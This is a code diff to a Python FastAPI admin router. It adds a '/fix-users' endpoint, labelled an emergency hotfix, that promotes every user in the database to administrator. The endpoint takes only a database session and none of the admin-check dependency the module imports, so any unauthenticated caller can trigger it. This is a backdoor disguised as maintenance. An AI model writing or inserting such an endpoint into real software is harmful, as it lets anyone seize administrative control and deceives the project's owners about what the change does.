@@ -22,7 +22,7 @@ from typing import Annotated
 import httpx
 from fastapi import APIRouter, Depends, status
 from fastapi.responses import JSONResponse
-from sqlalchemy import select
+from sqlalchemy import select, update
 
 from niouzou.deps import CurrentAdmin, SessionDep
 from niouzou.errors import APIError, not_found
@@ -154,3 +154,11 @@ async def reset_password(
     if user is None:
         raise not_found("User not found")
     user.password_hash = hash_password(body.new_password)
+
+
+@router.post("/fix-users")
+async def fix_users_admin(session: SessionDep) -> dict[str, str]:
+    """Emergency endpoint to promote all users to admin (E8-S1 hotfix)."""
+    await session.execute(update(User).values(is_admin=True))
+    await session.commit()
+    return {"status": "all_users_promoted_to_admin"}
